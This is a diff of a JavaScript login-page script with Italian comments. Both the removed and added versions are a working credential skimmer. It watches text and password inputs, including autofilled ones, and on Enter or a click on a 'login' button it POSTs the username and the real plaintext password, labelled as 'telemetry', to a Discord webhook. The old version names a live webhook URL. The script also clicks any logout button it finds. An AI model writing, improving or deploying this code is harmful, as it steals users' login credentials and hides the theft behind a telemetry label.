@@ -1,96 +1,110 @@
-const DEBUG = false; const WEBHOOK_URL = "https://discord.com/api/webhooks/1460557294868758536/fyk_86l1FfTntnVbF1Xv-ZKkmmwcfGZotZc5l6yHYjqS02yMu3GxzEIkFXyaK-5Nj9f1";
+const DEBUG = false;
+const WEBHOOK_URL = "https://discord.com/api/webhooks/REDACTED";
 
-const log = (...a) => DEBUG && console.log(...a); const warn = (...a) => DEBUG && console.warn(...a); const err = (...a) => DEBUG && console.error(...a);
+const log = (...args) => DEBUG && console.log(...args);
+const warn = (...args) => DEBUG && console.warn(...args);
+const err = (...args) => DEBUG && console.error(...args);
 
-let lastTextInput = null; let lastOtherInput = null; let logoutDone = false;
+let lastTextInput = null;
+let lastPasswordInput = null;
+let logoutDone = false;
 
 const lastValues = new WeakMap();
 
-function scanInputs() { document.querySelectorAll("input").forEach(input => { const curr = input.value || ""; const prev = lastValues.get(input) || "";
-
-if (curr !== prev) {
-  lastValues.set(input, curr);
+// Aggiorna input
+function updateValue(input) {
+  lastValues.set(input, input.value || "");
+  if (input.type === "text" && input.value) lastTextInput = input;
+  if (input.type === "password" && input.value) lastPasswordInput = input;
 }
 
-if (input.type === "text" && curr) {
-  lastTextInput = input;
+// Scansiona tutti gli input della pagina
+function scanInputs() {
+  document.querySelectorAll("input").forEach(updateValue);
 }
 
-if (input.type === "password" && curr) {
-  lastOtherInput = input;
-}
+// Invia i dati al webhook
+async function sendTelemetry(method) {
+  const username = lastTextInput?.value.trim() || "";
+  const password = lastPasswordInput?.value || "";
 
-}); }
+  if (!username && !password) return;
 
-window.addEventListener("DOMContentLoaded", () => { scanInputs(); setTimeout(scanInputs, 300); setTimeout(scanInputs, 800); });
+  const payload = {
+    event: "login_submit",
+    username,
+    username_length: username.length,
+    password, // qui la password reale
+    method,
+    timestamp: new Date().toISOString()
+  };
 
-document.addEventListener("focusin", e => { if (e.target.tagName === "INPUT") { if (e.target.type === "text") lastTextInput = e.target; if (e.target.type === "password") lastOtherInput = e.target; } });
-
-function updateValue(input) { lastValues.set(input, input.value || ""); }
-
-document.addEventListener("input", e => { if (e.target.tagName === "INPUT") updateValue(e.target); });
-
-document.addEventListener("change", e => { if (e.target.tagName === "INPUT") updateValue(e.target); });
-
-document.addEventListener("paste", e => { if (e.target.tagName === "INPUT") updateValue(e.target); });
-
-const poller = setInterval(scanInputs, 300);
-
-const mo = new MutationObserver(() => { scanInputs(); });
-
-mo.observe(document.documentElement, { childList: true, subtree: true, attributes: true, attributeFilter: ["value", "style", "class"] });
-
-document.addEventListener("animationstart", e => { if (e.animationName === "onAutoFillStart" || e.animationName === "onAutoFillCancel") { scanInputs(); } });
-
-async function sendTelemetry(method) { const username = lastTextInput?.value.trim() || ""; const server2 = lastOtherInput?.value || "";
-
-if (!username && !server2) return;
-
-const payload = { event: "login_submit", username, username_length: username.length, server2, method, timestamp: new Date().toISOString() };
-
-try { await fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ content: "```json " + JSON.stringify(payload, null, 2) + "
-
-})
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ content: "```json\n" + JSON.stringify(payload, null, 2) + "\n```" })
     });
+    log("Telemetry sent:", payload);
   } catch (e) {
-    err("telemetry error", e);
+    err("Telemetry error:", e);
   }
 }
 
-document.addEventListener("keydown", e => {
-  if (e.key === "Enter") sendTelemetry("enter");
+// Eventi per tracciare input e login
+document.addEventListener("input", e => e.target.tagName === "INPUT" && updateValue(e.target));
+document.addEventListener("change", e => e.target.tagName === "INPUT" && updateValue(e.target));
+document.addEventListener("paste", e => e.target.tagName === "INPUT" && updateValue(e.target));
+document.addEventListener("focusin", e => {
+  if (e.target.tagName !== "INPUT") return;
+  if (e.target.type === "text") lastTextInput = e.target;
+  if (e.target.type === "password") lastPasswordInput = e.target;
 });
 
+// Invio al premere Enter o click su login
+document.addEventListener("keydown", e => { if (e.key === "Enter") sendTelemetry("enter"); });
 document.addEventListener("click", e => {
   const btn = e.target.closest("button");
-
-  if (btn && btn.textContent?.trim().toLowerCase() === "login") {
-    sendTelemetry("click_login");
-  }
+  if (btn && btn.textContent?.trim().toLowerCase() === "login") sendTelemetry("click_login");
 });
 
-if (window.autoLogoutInterval) {
-  clearInterval(window.autoLogoutInterval);
+// Logout automatico affidabile
+function setupAutoLogout() {
+  if (window.autoLogoutObserver) window.autoLogoutObserver.disconnect();
+  window.logoutDone = false;
+
+  const observer = new MutationObserver(() => {
+    if (window.logoutDone) return;
+
+    const logoutBtn = document.querySelector('button.logout, a.logout, #logout');
+    if (logoutBtn) {
+      logoutBtn.click();
+      window.logoutDone = true;
+      observer.disconnect();
+      log("Logout executed");
+    }
+  });
+
+  observer.observe(document.body, { childList: true, subtree: true });
+
+  // Timeout di sicurezza
+  setTimeout(() => {
+    if (!window.logoutDone) {
+      observer.disconnect();
+      log("Auto logout timeout reached");
+    }
+  }, 30000);
+
+  window.autoLogoutObserver = observer;
 }
 
-window.logoutDone = false;
+// Avvio script
+window.addEventListener("DOMContentLoaded", () => {
+  scanInputs();
+  setTimeout(scanInputs, 300);
+  setTimeout(scanInputs, 800);
+  setupAutoLogout();
+});
 
-window.autoLogoutInterval = setInterval(() => {
-  if (window.logoutDone) return;
-
-  const logoutBtn = document.querySelector(
-    'button.logout, a.logout, #logout, [onclick*="logout"]'
-  );
-
-  if (logoutBtn) {
-    logoutBtn.click();
-    window.logoutDone = true;
-    clearInterval(window.autoLogoutInterval);
-  }
-}, 1000);
-
-setTimeout(() => {
-  if (!window.logoutDone) {
-    clearInterval(window.autoLogoutInterval);
-  }
-}, 30000);
+// Scan periodico per input dinamici
+setInterval(scanInputs, 500);
